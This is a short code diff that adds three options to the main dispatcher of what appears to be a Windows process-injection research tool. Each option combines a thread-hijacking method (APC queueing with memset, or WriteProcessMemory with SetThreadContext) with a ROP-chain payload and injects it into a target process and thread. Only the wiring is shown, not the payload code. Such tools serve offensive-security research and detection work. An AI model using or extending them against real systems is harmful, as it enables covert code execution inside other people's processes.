@@ -49,6 +49,7 @@
 #include "NQAT_WITH_MEMSET.h"
 #include "GhostWriting.h"
 #include "CFMA_MVOF_NUVOS_NMVOS.h"
+#include "WPM_STC.h"
 
 // Providers (Other)
 #include "HookProcProvider.h"
@@ -249,5 +250,34 @@ int main(int argc, char **argv)
 			executor->inject(pid, tid);
 			break;
 
+			// StackBomber + Payload
+		case 13:
+			executor = new CodeViaThreadSuspendInjectAndResume_Complex(
+				new NtQueueApcThread_WITH_memset(
+					new _ROP_CHAIN_PAYLOAD_SIMPLE()
+				)
+			);
+			executor->inject(pid, tid);
+			break;
+
+			// StackBomber + Rite Of Passage Payload
+		case 14:
+			executor = new CodeViaThreadSuspendInjectAndResume_Complex(
+				new NtQueueApcThread_WITH_memset(
+					new _ROP_CHAIN_PAYLOAD_ADVANCED()
+				)
+			);
+			executor->inject(pid, tid);
+			break;
+
+			// Stable StackBomber + Payload
+		case 15:
+			executor = new CodeViaThreadSuspendInjectAndResume_Complex(
+				new WriteProcessMemory_SetThreadContext(
+					new _ROP_CHAIN_PAYLOAD_ADVANCED_SAFE_STABLE()
+				)
+			);
+			executor->inject(pid, tid);
+			break;
 	}
 }
